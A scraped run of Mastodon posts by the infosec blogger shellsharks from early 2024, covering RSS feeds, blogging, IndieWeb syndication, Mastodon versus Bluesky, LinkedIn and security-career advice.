Go follow them. As for reply guys, this comes with A. Scale (bsky doesn&#39;t have a huge user base), B. Invite-only-ness and C. People are just more active here, thus more replies, not all of which you (or others) may like. . . ü§∑‚Äç‚ôÇÔ∏è The reply guy thing is interesting too. Like, is this reply a &quot;reply guy&quot; reply? I do kinda disagree or hold slightly differing viewpoints on some things as well as agree with you on others. To me, this is honest, genuine, good-spirited engagement albeit a little debate-ey. Anyways, I think choice is great and if you&#39;re (or anyone) happy and making connections on bsky or threads or wherever than good for you yknow? I think the whole &quot;my social network is better than yours&quot; thing is kinda silly anyways. They all have pros and cons and which is *better* is subject to a lot of variables. Hell, I tried Mastodon a few times before it stuck for me. shellsharks @shellsharks 2024-02-07T05:06:13Z @karen I&#39;ve got one =) https://shellsharks. com. There&#39;s actually two RSS feeds as well. One with my main &quot;posts&quot; (mostly infosec and tech stuff) and then I have a separate &quot;notes&quot; feed with random short-form stuff, such as my most recent hot takes on chips =P https://shellsharks. com/notes/2024/01/29/thoughts-on-chips. shellsharks @shellsharks 2024-02-07T15:25:19Z @matthiasott Yep! Not only do I have an #RSS feed, I actually have *two*! One for my regular feed of posts and another for my &quot;notes&quot; (short-form stuff). - Posts feed: https://shellsharks. com/feed. xml- Notes feed: https://shellsharks. com/note-feed. xml #notes #blogging #indieweb shellsharks @shellsharks 2024-02-07T15:36:07Z @jcrabapple I am always looking for new things to tac on to my site and am curious about this. Where do you see the statuslog when compared with your /now page and your mastodon feed itself? Are you just manually updating your html each time you want to have a new status or are you doing something else? Are you archiving old statuses or is it completely ephemeral? Cheers! shellsharks @shellsharks 2024-02-07T15:44:22Z @jcrabapple Ah nice. Yeah i&#39;m sorta interested in doing something like that. I&#39;ve been thinking of standing up a single-user Mastodon instance on shellsharks. com domain and then just mirroring the last post as the statuslog directly on the site (or something like that). If I did do something simpler like what you&#39;ve done though I would also replicate that same status on the /Now page though since it does fit kinda well in that context imo. shellsharks @shellsharks 2024-02-07T19:04:47Z @TheGibson Yeah I wanted a vuln named &quot;GumsBleed&quot; üòû. It would have been a great excuse for my next dental appointment. . . shellsharks @shellsharks 2024-02-07T19:29:08Z @lars To answer your first question, I think a separate post type would be good and make more sense. As for your front page, this is something I&#39;ve been wrestling with how to do cleanly as well. I only somewhat recently introduced the concept of &quot;notes‚Äù on my site and for a while I&#39;ve just been featuring the latest note as the top item in my list of links on my home page. This is fine for pushing people into that note and *maybe* into my feed of other notes but its not obvious at all that that is whats happening from what you see on my home page. My plan (which IM working on now) is to have my notes show up below my post list for smaller screens and on the side bar (right-side) on larger screens. Though I&#39;ll have to see how this looks when I actually have it implemented. My header I *try* to keep somewhat clean so I don&#39;t really want links at the top for &quot;posts‚Äù and &quot;notes&quot; but you could absolutely do it. That said, I think your &quot;Writing&quot; drop-down is perfectly fine. I have been thinking of changing up how my post list is presented though. Right now its very simplistic with just a publish date and blog title but I like the idea of having the description as well like you do. . . . fun stuff to consider! shellsharks @shellsharks 2024-02-07T19:33:23Z @joshsternberg I don&#39;t think it moves the needle much for me unless a substantial infosec presence makes its way there (which would surprise me). I can see how them opening the gates could quickly expose some moderation and scaling issues and annoy the folks who like the &quot;cool-kids-club&quot; vibes. I really don&#39;t see what bluesky brings to the table that isn&#39;t already covered by Twitter / Threads / Mastodon. That said, I like having non-Meta, non-Twitter options out there for folks and if Mastodon isn&#39;t meeting their needs and bsky is then that&#39;s great. shellsharks @shellsharks 2024-02-07T23:03:49Z @jerry Will it have a rule for CVE-2024-7337H, i. e. &quot;GumBleed&quot;? shellsharks @shellsharks 2024-02-08T19:27:06Z My new blogroll is live! https://shellsharks. com/blogroll These are a list of blogs/sites I read and recommend.

Suggestion(s): You should have your Mastodon link on your site (I didn&#39;t see it if it&#39;s already there) and maybe consider adding search sometime in the future. I personally love having search on my site since I reference my own stuff all the time. Cheers! shellsharks @shellsharks 2024-02-09T15:49:28Z @Muddobbers I think it would definitely affect your opportunities. shellsharks @shellsharks 2024-02-09T16:28:23Z @rgarciairvine Not natively no. There maybe some bridges available. Alternatively you could try this particular client that has bsky integration https://apps. apple. com/us/app/sora-for-mastodon-bluesky/id6450969760. Another option is to follow the bsky profiles RSS feed using https://mastofeed. org/ which can push it into Mastodon. shellsharks @shellsharks 2024-02-09T17:54:38Z @cheapchrome2020 üëã hi shellsharks @shellsharks 2024-02-09T18:07:19Z @blakehensley @washingtonpost QPs are on the roadmap for Mastodon https://joinmastodon. org/roadmap. As for why some clients support a qp-like feature, it&#39;s a popular requested feature and not difficult (imo) in practice to provide. A QP is really just a link to another post where you can see the text and OP account. I think whether it works or not in other clients will vary. shellsharks @shellsharks 2024-02-10T14:14:13Z @rendick Yeah we&#39;re pretty great üòú shellsharks @shellsharks 2024-02-10T18:30:13Z @molly0xfff My blog: https://shellsharks. com/ My blogroll: https://shellsharks. com/blogroll shellsharks @shellsharks 2024-02-11T12:09:42Z @cydave Will do!!

Don&#39;t think I&#39;ve ever actually taken/gotten a job which originated from LinkedIn though. . . - Though most of my (and any one elses) LinkedIn feed is cringey nonsense I do surprisingly find some interesting blog posts from time to time. - I don&#39;t have enough analytics on my site to give any useful numbers, but I know LinkedIn drives *some* amount of traffic to my site, and thus to my other properties across the web ü§∑‚Äç‚ôÇÔ∏è. - It is, in the end, where most jobs/hiring managers will want to turn when they want to look at your ‚Äúprofessional profile‚Äù, even if you have a blog or w/e else, those will almost always be supplemental to 1. your resume and 2. your LinkedIn profile. So having a presence on Linkedin is important for that reason I suppose. I have taken a somewhat principled stance on how I present myself on LI. Rather than reduce myself to my timeline of jobs, I&#39;ve decided to instead emphasize my skills, my portfolio (blog), my education, my credentials, and the orgs I am a part of.

Outside that, I&#39;ve actually found that blogging is a good way to help with burnout. - It can be a place where you can vent (anyone seen that crankysec article making the rounds?)- It can help you document something that you can reference in the future, which may save you time and mitigate burnout possibility- It let&#39;s you &quot;achieve&quot; something regardless of whether you feel what you did at work was impactful. So if you&#39;re churning at work, write about what you are doing and you will have that as evidence of your toil that you can share rather than just having your hours completely wasted. - I write about a bunch of other reasons I like blogging here for anyone interested https://shellsharks. com/you-should-blog. shellsharks @shellsharks 2024-02-12T18:39:39Z @kern Hey!

Cheers! shellsharks @shellsharks 2024-02-13T14:25:57Z @cybersecdancer I have found that *most* infosec disciplines have are plenty useful in cross-discipline contexts. Consider all the ways SOC analysts/practitioners must be knowledgeable in how adversaries can exploit trust, spoof identity, attack weak access controls, etc. . . Plus, SIEM/content engineers need to know how to extract, parse and generally grep logs/telemetry from IAM-related sources. So - couple that useful set of deep expertise with the very fact that you *do* have a hyper-relevant MS degree and I don&#39;t see why you couldn&#39;t pivot into SOC/IR/Forensics with relative ease.

I also agree that the ‚ÄúThreadiverse‚Äù (e. g. Lemmy/Kbin) has not gained traction / came close to any sort of critical mass but I think it *could*. We need more people to commit to posting, replying and spending time there. It‚Äôs cross-functionality with the growing ‚ÄúFediverse-of-things‚Äù (AP-compatible stuff) gives these tools a lot of extra power imo as anyone on Mastodon or elsewhere could comment on a Lemmy thread, etc‚Ä¶ So maybe there is a better place out there, maybe theres some amazing Discord server that would be best right now to spend your time but for the future, I say we invest in Fediverse-enabled communities and Lemmy/Kbin are great options for that right now. shellsharks @shellsharks 2024-02-17T22:52:44Z @mmuller @jerry Howdy! ü§† Here is a good place to be. shellsharks @shellsharks 2024-02-18T13:22:38Z @KataKabun Even the bots think X is too toxic ü§£ shellsharks @shellsharks 2024-02-18T13:34:12Z @frankie oi üëã shellsharks @shellsharks 2024-02-18T14:31:45Z @frankie Not too shabby, yourself? shellsharks @shellsharks 2024-02-18T15:50:36Z @jerry But where will I ever meet all my beauties now? üòì shellsharks @shellsharks 2024-02-18T15:53:35Z @jerry formal request for an infosec. beauties instance that federates with them. shellsharks @shellsharks 2024-02-18T16:00:51Z @dntlookbehindu I wrote something on-ish this subject and totally agree https://shellsharks. com/notes/2023/11/14/stop-worrying-about-certification-paths shellsharks @shellsharks 2024-02-18T22:07:11Z Halo S2E3 spoilers @Sidneys1 Pumped abt this show shellsharks @shellsharks 2024-02-19T01:45:23Z @carrickdb I hate CSS but love the challenge of designing everything myself.

You can also poke around my blog for anything else interesting. Cheers! shellsharks @shellsharks 2024-02-19T04:47:28Z @breadandwater Though it&#39;s been a while, I think some of the other old places are still valid. . . e. g. SimplyHired, Monster &amp; Indeed to name the big ones. ZipRecruiter also seems to be a big name but I&#39;ve never used them. Less traditional means of search you could consider include here on Mastodon (use the # fedihired tag) and Reddit (via hiring threads). Good luck! shellsharks @shellsharks 2024-02-19T18:50:42Z With my foray into the world of #indieweb, I&#39;ve had to think about my strategy for post/content syndication across the site, the #fediverse and other &quot;social places‚Äù. I‚Äôve written up my syndication strategy here! https://shellsharks. com/syndication-strategy #mondayblogs #posse #pesos shellsharks @shellsharks 2024-02-19T19:00:53Z @sudorandom I guess this just depends how you use LinkedIn. See for me, LinkedIn has very *limited* value (https://shellsharks. com/notes/2024/02/11/linkedin-s-value-to-me). The way for me to maximize this value is really to just connect with anyone who wants to connect with me. This means more people potentially funneled to my site (and other properties), more network connections from folks in the field who may have stumbled across something I wrote and want to connect further, and three potential professional opportunities (of which there have definitely been some). I don&#39;t spend a lot of time on LinkedIn. The feed is atrocious, the platform (like so many others) is just becoming an AI training farm and there&#39;s never felt like any real ownership of the content I could put there or even over my profile. If you look at my profile even, you can see that I&#39;ve gone somewhat out of the way to make it very non-traditional in the LinkedIn sense. If you however use LinkedIn a lot and rely on having a higher fidelity main feed or want to avoid spam as much as possible you may be better served by being pickier with your connections. YMMV. shellsharks @shellsharks 2024-02-19T19:12:51Z @capjamesg Hi! I came across this piece of yours https://jamesg. blog/2024/02/19/personal-website-ideas/ and got a few ideas for things to add to my site! I have been maintaining a note which lists a bunch of &quot;components&quot; one could add to their site here as well https://shellsharks. com/notes/2023/08/15/website-component-checklist.

With shares though, I&#39;ve seen people do this and it seems like it would be too cumbersome to maintain *everything* I share out as I tend to share a lot. . . that said, I&#39;m always looking to add more to the site and adopt more indieweb strategies so maybe in time Ill figure out a strategy that works for me‚Ä¶ shellsharks @shellsharks 2024-02-20T18:35:39Z @dingusxmcgee For the longest time I really didn&#39;t like the sound of my voice on voicemail and other recordings and frankly thought that my voice ‚Äúdidn&#39;t really sound like that&quot;. I started a podcast a little while back and when listening back to my voice recorded on a decent mic I found the tone/sound of my voice to be far more accurate and &quot;better-sounding‚Äù. So my advice, try getting a good mic, record yourself and see if you like it better. If so, try to integrate it into your meeting and general audio capture system. shellsharks @shellsharks 2024-02-20T23:06:23Z @heny Howdy! ü§† I have some infosec follow-friday recommendations here if you&#39;re interested https://shellsharks. com/notes/2023/10/20/infosec-mastodon-starter-pack#for-infosec-folks shellsharks @shellsharks 2024-02-21T04:27:15Z OK, gotta admit this is sick.

Of these, I could probably recommend any of the first 6 in terms of easy, low-cost and pretty (subjectively-speaking). That said, I use Github Pages which is also low-cost with no online CMS. There are some boxed themes that look nice and thus wouldnt require much &quot;coding&quot; outside of setting up some config variables. You&#39;d also have the option to get more advanced with the theme, etc. . . later if you wanted. shellsharks @shellsharks 2024-02-21T14:54:05Z @CliffWade Mornin&#39;!

But what its important for is for establishing a single source of identity / content. So wherever I post on the internet it always funnels a reader to my site which I own. As we&#39;ve seen a lot lately, social media and other places owned by big corps are not permanent. Some more on this topic here https://shellsharks. com/notes/2023/08/16/your-website-your-identity. shellsharks @shellsharks 2024-02-21T20:49:46Z @ittavern Most people don&#39;t even have a blog/site, much less capture what they post on social media on their site (what I call reverse syndication), so no I wouldn&#39;t consider this a common practice. As for the use of the word ‚Äúsyndication‚Äù, I&#39;m not sure there is anything inherently special/specific about using it. It evokes RSS vibes, and is a little more descriptive in terms of having content sourced entirely from your site but made available in many other places (i. e. social media points of presence). shellsharks @shellsharks 2024-02-21T20:58:23Z @ittavern If it helps make it make more sense‚Ä¶ Even for folks who *do* have a blog, in most cases they are not taking *everything* they post on, let&#39;s say Mastodon and making it available on their site. IndieWeb absolutists (take a look at Aaaron Parecki‚Äôs site for example - https://aaronparecki. com) will map all posts from Mastodon back to their blog, and vice versa. I&#39;m somewhere in the middle. I try to take only interesting / substantive things that I post on Mastodon and &quot;reverse syndicate&quot; them back to my site (usually in the form of &quot;notes‚Äù). Most bloggers *may* syndicate original posts sourced from their site to their socials but will only rarely take a post originated on a social media site, and convert it into a post/note on their main web site. shellsharks @shellsharks 2024-02-22T00:43:30Z @mikecherry @nf3xn Sound off!

I find my feed to just be bursting with cool links, funny takes, and other informative stuff moreso than just shitposts and life takes. It takes a bit to curate a consistently solid feed though. Mass-follow people to start and then normalize unfollowing people in your timeline you don&#39;t wanna hear from. shellsharks @shellsharks 2024-02-22T12:47:39Z @randomxusr Stahhhhhhp! ü´† shellsharks @shellsharks 2024-02-22T13:43:13Z @galapagosgooblin hashtags are a good place to start. What kinda content are you interested in seeing? If it&#39;s infosec, you could start with the local feed here or follow tags like #infosec or #cybersecurity. Other tags can be used similarly. I can agree though that getting started is slow-going. shellsharks @shellsharks 2024-02-22T16:43:52Z @ittavern I think it&#39;s probably relatively common for people to have more than one acct on multiple instances as an artifact of figuring out how to use Mastodon and what instance is best for them. I also think it&#39;s rather uncommon for people to ultimately be *active* on more than one account though. I&#39;m in the latter group ü§∑‚Äç‚ôÇÔ∏è. shellsharks @shellsharks 2024-02-22T18:02:53Z @taters I let mine expire recently as well (after years of maintaining it). I think it depends if you have equivalent (or superseding) certs. I (for example) have OSCP, eCPPT and a slew of offensive SANS certs, so I don&#39;t really need an active CEH on the roster. Let me add that their CPE portal &quot;ASPEN&quot; or w/e is one of the least pleasurable places on the Internet. shellsharks @shellsharks 2024-02-22T18:12:06Z @Nyxphadora Howdy ü§† and welcome! üëã shellsharks @shellsharks 2024-02-22T18:14:29Z @sycophantic Have you followed this project? https://www. caido. io//.

Some of the weirdness with cross-instance post/reply propagation, relay stuff, etc. . has scared me off a bit from doing so. (Mostly though I&#39;ve just been too busy with all the other side projects to bother with it) shellsharks @shellsharks 2024-02-23T04:06:50Z @rettux You could create a list and put everyone you follow in it then set the list to not show up in your home timeline. This *shluld* put all your hashtag hits in your Home feed and all your follow posts/replies/boosts in your list feed.

If it helps, here&#39;s a guide I made for breaking into infosec https://shellsharks. com/getting-into-information-security. Shoot me a msg anytime to bounce questions or w/e. Hoping everything works out. shellsharks @shellsharks 2024-02-23T14:26:10Z Another round of great #infosec / #cybersecurity accounts for #followfriday! - @https - @bees - @grey- @ErikvanStraten - @netbiosX - @azasypkin - @andrazaharia - @sc00bz ‚≠êÔ∏è Special mention of @vogon_poetry who makes some truly unique infosec-infused artwork. shellsharks @shellsharks 2024-02-23T14:40:39Z @jcrabapple The problem (to me) isn&#39;t even that it is &quot;half baked‚Äù, moreso that it isn&#39;t really even ‚ÄúFederation‚Äù in the sense that people are expecting (i. e. like Mastodon/AP/Fediverse), as well-described in this thread https://merveilles. town/@lrhodes/111932065780204638 (which I think you&#39;ve probably seen). The annoyance comes from the bsky cheerleaders who now point to this ‚Äúfederation‚Äù capability and say they&#39;ve achieved what&#39;s best about Mastodon while also have the other perks of bsky (namely, BYOAlgo I guess?) when in fact their version of federation does not actually give them any level of real autonomy. This fact is either completely lost on them or they are somewhat maliciously obscuring it because they want to A. feel superior or B. have bsky &quot;win&quot; the social media wars (whatever that means). For me, I just find the rah rah rah-ing of one&#39;s preferred micro-blogging social platform to be (at this point) utterly exhausting. They *all* have pros and cons and one&#39;s strengths will make it better for certain groups than it does for others, so there is no objectively &quot;best&quot; network imo. You can *try* to then make the case for which has the best long-term staying power but I don&#39;t think a large percentage of people are going to weigh which network they choose *now* based on the property of longevity, instead they choose based on things like who&#39;s there, will they be safe, do they have reach, is it easy, etc‚Ä¶ I like Mastodon, my plan for the forseeable future is to invest my time building a community and making connections here, and I don&#39;t look down on others for liking bsky or threads. With any luck, between AP-enabled federation and third-party bridging we&#39;ll all be able to chat together soon enough anyways. shellsharks @shellsharks 2024-02-23T15:06:42Z @developerjustin My blog is not &quot;federated‚Äù/using AP, though I&#39;ve considered looking into how I might do this. From what I can tell, the real benefit of doing this would just be auto-syndicating content from the site to the Fediverse but there are lots of other ways to do this that offer more customizability/flexibility. You can read about my own &quot;syndication strategy&quot; here if you&#39;re interested. . https://shellsharks. com/syndication-strategy Though I don‚Äôt talk about it in the article, I think this makes a decent case against bothering with native AP-integration for your site (unless it&#39;s trivial to enable out of the box like with WP or micro. blog). Moderating comments or figuring out how to use your blogs handle to have conversations with those who interact with syndicated posts seems like more trouble than its worth compared to just having a separate handle on the Fediverse and just posting links to your new content as it comes out. There&#39;s always #RSS too! My various feeds can be found here https://shellsharks. com/feeds. Services like MastoFeed (https://mastofeed. org) are other alternatives for auto-syndication to consider. shellsharks @shellsharks 2024-02-23T16:16:21Z @infoseclogger this? https://www. board-cybersecurity. com/incidents/tracker/ shellsharks @shellsharks 2024-02-23T17:36:52Z @Patricia Here&#39;s some #indieweb-compatible options to consider https://shellsharks. com/indieweb#hosting. The first 6 options are all pretty easy to get started and use it seems. I guess it depends what (if any) requirements one would have in terms of what they want on their site. shellsharks @shellsharks 2024-02-23T17:48:59Z @phurd Is the &quot;Live feeds‚Äù feature essentially just the local feed? I think so based on this &quot;These are the most recent public posts from people whose accounts are hosted by infosec. exchange. ‚Äù I do think there&#39;s a lot of people who just share links to things they find interesting. But in that mess there are also A LOT of people (on this instance and abroad) to either have some novel commentary on an article when they share it or are posting original stuff (either with a link or a link to something they&#39;ve published themselves). This is why curating a feed is a must (as compared to relying on the Local feed, which should be more exploratory in how you use it imo). It definitely took me a bit but my feed I&#39;ve built up is super high-fidelity in terms of being interesting, diverse and not just people-sharing-links with no context. shellsharks @shellsharks 2024-02-23T18:42:26Z @john_fisherman @fumacapt Heres something I wrote on RSS a while back https://shellsharks. com/an-ode-to-rss If it&#39;s of any use for your own piece you can check out my Feeds page https://shellsharks. com/feeds and a quick writeup on why I built it and how I styled RSS file(s) https://shellsharks. com/notes/2024/02/21/web-feed-makeover shellsharks @shellsharks 2024-02-23T19:14:56Z @thesaint Howdyü§†! shellsharks @shellsharks 2024-02-23T21:19:08Z @scarletfire Looking forward to it. shellsharks @shellsharks 2024-02-24T00:49:02Z @richms Howdy! ü§† Here&#39;s a little something you might find useful as you settle in https://shellsharks. com/notes/2023/10/20/infosec-mastodon-starter-pack. shellsharks @shellsharks 2024-02-24T13:18:55Z @loneicewolf Hi! üëã and welcome.

Less so tips on mechanics or methodology. That said, some things I like to remember when blogging include. . . - write with a beginners mindset- include lots of links and citations- for the love of god, put a &quot;date published&quot; line Good luck!

Will update üßô‚Äç‚ôÇÔ∏èüòÄ shellsharks @shellsharks 2024-02-26T04:17:49Z @TagHunt Some thoughts off the top of my head. . . - More people (duh), but certainly doesn&#39;t need *everyone*- Better discovery (this can come in many forms, some form of optional algos could help solve for this)- Better account portability- I&#39;d love to be able to tie my identity to my domain rather than an instance, even if it&#39;s a specific instance that I attach my identity to at any one time. (which would help with the above item) shellsharks @shellsharks 2024-02-26T04:32:50Z @damon The iOS app ‚ÄúReeder‚Äù is pretty close to perfect for me. Clean design, syncs with read-it-later and RSS and has some good customizability. But what could I add? (Some random ideas below‚Ä¶. ) - Maybe some exploration capability to find new sources / blogs?- Project Tapestry is looking into other sources from the web I could plug into, I&#39;m interested what they will come up with but it may be that Im perfectly happy with RSS. - Now, when I want to add new feeds I have to go to my RSS platform Feedly, so having this capability native in the app would be better. I could even send interesting blogs I find on say, Mastodon directly to the app and be subscribed. - Would be cool to have some social capabilities built in to. Like, I could send web mentions or it could find Mastodon links and I could send a toot at someone if I read their blog and have feedback or just want to say hi. shellsharks @shellsharks 2024-02-26T19:58:30Z @kobziarz You made a good choice.

Use it if you want, don&#39;t if you don&#39;t. Fwiw, there *are* clients that have started to try and build algo-based feed. If you&#39;re on iOS, check out Sora for example. shellsharks @shellsharks 2024-03-01T17:57:26Z #followfriday is back, here&#39;s some great #infosec / #cybersecurity accounts I&#39;ve followed recently.

This little app I just discovered by @paulcuth , https://rss-is-dead. lol will help you find all the RSS feeds available via sites your follow list has in their Mastodon profiles. I definitely recommend folks extend their followerships to subbing directly to peoples blogs (via RSS) rather than relying on toots when new things are published. I‚Äôll be using it shortly to add any residual blogs I may have missed to this resource I&#39;ve been maintaining of indie infosec blogs - https://shellsharks. com/infosec-blogs.

Whatsup? shellsharks @shellsharks 2024-03-04T01:23:11Z @howelloneill I think Feedly can do this based solely off of sub numbers that come through the Feedly app itself and probably can&#39;t tell sub numbers that are going through any other client. Feedly has good marketshare so maybe they think this is valuable info to expose for people though? I&#39;ve used quite a few RSS readers over the years and can&#39;t remember a single one that sorted feeds by anything other than chronological or which had the most residual unread items. I do think it would be possible to pull things from Google, or Alexa Rank to try and figure out popularity though (or Feedly popularity rankings as you mentioned). shellsharks @shellsharks 2024-03-04T01:33:53Z @fre Hey! I only read about the first three sections before I decided to save-it-for-later in my read-it-later app but from what I did read I thought it was great! I&#39;ll add that the site&#39;s clean aesthetic is great for getting right to the point =). There&#39;s lots I could say in terms of what you *could* add to the site itself if you wanted to get adventurous but more than anything else, I think you should slap on an RSS feed =). Anyways, looking forward to more stuff you post. cheers! shellsharks @shellsharks 2024-03-04T01:47:05Z @lcamtuf I&#39;ve always said something very similar with regard to infosec disciplines that many regard as ‚Äújunior‚Äù or &quot;easy‚Äù. Vulnerability Management is one such role that I think is pretty easy to get started in (and many in security do) and for many considered to just be something that is easy/junior when in reality, doing *advanced* VM is something that takes a lot of finesse, organizational knowledge, cross-disciplinary skills, coding chops, etc. . . Same could be said for things like &quot;SOC Analyst‚Äù. Sure you can run junior folks through that role but there is definitely a spectrum of proficiency that should not be overlooked. So to pivot back to your point, sure you can check boxes for some of these controls but to do things ‚Äúright&quot; (for your org), or at-scale, or in a way that provides value without too much of a cost-sink, you usually have to go beyond the basics. shellsharks @shellsharks 2024-03-04T02:16:55Z @count3rmeasure I&#39;d say *probably* not. But I suppose it could. Bleeding-edge or newly updated WPscan engine with experimental/dangerous plugin? Maybe the site is not WP. com hosted (i. e. self-hosted) and thus prone to being knocked over? Maybe some weird defensive mechanism that makes it look like its down but just for you? WPscan does have a tuneable &quot;aggressive&quot; mode flag for a reason I suppose. Are you asking because you suspect you could have knocked something down or are as a precaution before scanning because you want to be delicate? shellsharks @shellsharks 2024-03-04T19:30:36Z @jerry @owasp *ahem* a presence on the #jerryverse you mean üòÅ(I consider it Fediverse premium) . . . and welcome OWASP!! shellsharks @shellsharks 2024-03-05T01:13:03Z @cyberguymorley Hello!! üëã shellsharks @shellsharks 2024-03-05T02:43:43Z Never been on TikTok before but someone reached out to me on Linkedin regarding a clip they came across which featured my ‚Äú10-Step Getting Into Infosec Playbook‚Äù (https://shellsharks. com/getting-into-information-security#getting-into-infosec-playbook). The infosec-TikTokker, &quot;bytesizedsecurity‚Äù had some very nice things to say about both it and the wider world of stuff I post about from a cybersecurity perspective. The clip here: https://www. tiktok. com/@bytesizedsecurity/video/7340729475618884895 What&#39;s funny is I had noticed a real uptick in page views for the site and out-of-the-blue Linkedin connection requests over the past couple days and had attributed it to something I had maybe posted on Mastodon. But of course it&#39;s something like TikTok instead üòÜ.

That and the much-related (but not listed here) ‚Äúno one will care what I have to say / no one will read‚Äù crowd. To anyone who matches these descriptions or has these feelings, know that you‚Ä¶ A. absolutely have something to say, and a blog is a great place to say it, and. . B. The Internet is a huge place. People *will* find your site and read it, no matter how niche it is, or how poorly designed, or how seemingly poorly written. There&#39;s no thought you could have that couldn&#39;t educate someone else out there and nothing you could write about that there isn&#39;t some community out there that would have similar thoughts. As for the other reasons folks don‚Äôt have a site. . . 1. Github pages (and some other platforms) is 100% free (so if expense is an issue then it doesn&#39;t need to be) 2. There are more hosting providers than ever these days, many of which make it dead simple to get started, so don&#39;t let complexity be a stopping point. You can always start real simple and get more complex as you go. 3. Time may be the biggest hurdle. I would just say that a blog isn&#39;t something you need to maintain or publish regularly. Just put something up and post when you have time. Posts can be short, they can be sloppy, they can be whatever, Since you own the site, you can always edit something poorly written later too. For everything else, you could check out my post about ‚ÄúWhy I Blog. You Should Too!‚Äù for other advice/inspiration.

Out of curiosity, (and since you mentioned it) I decided to peruse your list of accts you follow to see what OSINT/infosec folks I could follow myself. I found 5 or so active infosec/OSINT accounts but what I mostly discovered seemed to be folks who reserved their username and never posted anything (yet?), people who havent posted in the last 5-6 months or a few people who have mostly just reposted some stuff you&#39;ve dropped there. You *are* following a lot of accounts that have &quot;OSINT‚Äù in their bio so I don&#39;t doubt that you are getting some decent traction and maybe even some discussion on OSINT-related stuff you post but I still fear that bsky has just not gotten infosec community traction quite yet. Personally, I would hope folks would invest their time *here* rather than on bsky. From your perspective, &amp; as @ch4m30 asked, do you see bsky as a better place for OSINT-related stuff? Is there something else that you find attractive about bsky over Mastodon?

Going to Federated timeline though? Beware, there be monsters. (Also just mostly weird nonsense) shellsharks @shellsharks 2024-03-14T17:25:40Z What does the #infosec / #cybersecurity (or infosec-adjacent) community think of &quot;establishing&quot; a go-to hashtag for asking infosec-related questions? Something like #AskSecFedi or #AskFediSec? Personally I think the latter has a better ring to it but curious what others think. I&#39;ve seen a lot of people in the community ask questions that don&#39;t get answered due to classic social reach issues but perhaps a dedicated hashtag could help alleviate some of that. (If you have a catchier tag feel free to comment!) shellsharks @shellsharks 2024-03-14T17:27:02Z I&#39;ll add that #askfedi &amp; #fedihelp exist but are obviously scoped in a much broader fashion. shellsharks @shellsharks 2024-03-14T19:37:10Z @riveck Honestly I didn&#39;t do much shopping at the time. I heard about GitHub pages and liked the fact that I could do all my writing locally with markdown so just went with it. Had I known about other SSGs I might have selected something different. These days, if I were to start all over again or rearchitect the site I&#39;d probably go with Hugo or 11ty. shellsharks @shellsharks 2024-03-15T12:24:03Z A nice quick piece on the continued success of the infosec community here on Mastodon. Thanks of course to @jerry! (who gets a nice shoutout in the article as well as a few others. ) I agree with the author, I&#39;ve enjoyed connecting with folks here more than I ever did on Twitter and it also kindled in me a newfound love for the Fediverse and the IndieWeb. Long live fedi-infosec!https://infosec. exchange/@DomainTools/112094855998655234 shellsharks @shellsharks 2024-03-15T12:55:36Z @montar This I admit is not the *most* helpful/direct answer to your ask but if you wanted, you could import the . opml file I make available in this piece (https://shellsharks. com/infosec-blogs) and then unsub from all the non-RE blogs. It&#39;s kinda a needles-in-a-haystack approach but guaranteed you&#39;d discover some otherwise-hard-to-find-gems in time. shellsharks @shellsharks 2024-03-15T13:13:44Z @defaultvlan I&#39;ve always kinda liked Confluence üòÖ. Does that make me basic? shellsharks @shellsharks 2024-03-15T15:42:52Z Another round of great #infosec / #cybersecurity accounts for #followfriday! - @suhacker - @hdesk - @syrion - @ianw - @coffee - @tklengyel shellsharks @shellsharks 2024-03-15T15:49:33Z @atomicpoet@atomicpoet. org @atomicpoet@firefish. city I&#39;ve been interested in doing more in the way of hosting my own Fediverse server from my main domain (shellsharks. com) and likely migrating this account to there but have had a number of mental/technical obstacles. One thing I&#39;ve been curious about was whether I could migrate followers to an existing account, i. e. if I stood up an account &quot;shellsharks@shellsharks. com&quot; and got 10 followers there, could i merge this account into that and it would be additive in terms of the followers? I&#39;m also interested in how you are hosting. Finally, I&#39;ve been considering going with glitch Mastodon (because of compatibility with Ivory client) but have considered other Fediverse software since it may still work with other clients I like (i. e. Feditext). Thanks! shellsharks @shellsharks 2024-03-15T17:21:53Z @rossnesbitt Hii! üëã shellsharks @shellsharks 2024-03-15T20:14:43Z @kepano Agreed. Mine features this adorable li&#39;l guy https://shellsharks. com/404 shellsharks @shellsharks 2024-03-15T20:22:11Z @jgmitchell303 IMO, experience is experience and if what you&#39;ve done on the side, or via &quot;self-employment&quot; or w/e is applicable to the responsibilities of the role you are applying for I think it is valid, useful to have on the resume and something I personally would take seriously and ask questions about. shellsharks @shellsharks 2024-03-15T23:56:49Z @evacide seems like a solid vibe to me #bogwitch shellsharks @shellsharks 2024-03-17T12:47:11Z @hirad @ErikUden crazy to think it&#39;s only 1m DAU given how lively things seem here (my experience at least). shellsharks @shellsharks 2024-03-18T10:46:21Z @cybersoldier &quot;engagement&quot; is always a bit spotty here for various reasons. People cycle in and out of being active here, people trying competing social networks, no algo means sometimes your stuff just won&#39;t surface in feeds that normally would engage with it, etc. . . Are you noticing a dip in engagement on your own posts or just in general you feel it&#39;s less lively? FWIW, I think it&#39;s maintained a steady level of liveliness for months now. shellsharks @shellsharks 2024-03-18T12:40:47Z @adhdeanasl oh to live in a world where there is but one mega crisis üò≠ shellsharks @shellsharks 2024-03-18T13:48:08Z @nogweii Hey! I added you to the /starsharks thing =P. Also wanted to ask you how you were hosting your Fediverse instance. I&#39;ve been thinking of standing up my own personal instance but haven&#39;t decided on the best way to host it. Appreciate the wisdom! shellsharks @shellsharks 2024-03-18T13:52:50Z @ittavern Hey! Good good. Been busy with some travel and getting ready to return to work this week after being off for months. As such, I haven&#39;t really got to spend much time Shark-after-dark-ing but I suspect that will pick up by next week when i fully return to work and A. have more time for casual Mastodon-ing and B. am working on things that I&#39;ll likely live-toot haha. I&#39;m also getting more serious about self-hosting or otherwise more substantially hosting a fediverse instance for myself. I&#39;ve been experimenting with masto. host for sharkafterdark and its *OK*. Kinda slow at the base tier. I have an old trashcan mac pro I want to repurpose into a selfhosting box but am a bit of a self-hosting n00b so I have a lot to learn first. shellsharks @shellsharks 2024-03-18T13:54:46Z @atomicpoet Ok cool thanks for the response! I&#39;ve heard of spacehost and had considered trying them out when they went live. I have a single-user instance I&#39;m experimenting with on masto. host but on the base tier it is painfully slow. If you don&#39;t mind me asking, what is the pricing/specs you have on the spacehost-run instance? I&#39;d like to single-user instance it up but want to be realistic about how much it will cost me to run one that performs acceptably. shellsharks @shellsharks 2024-03-18T13:55:52Z @randomxusr Hmm this is interesting idea. Not sure how we could centralize an account 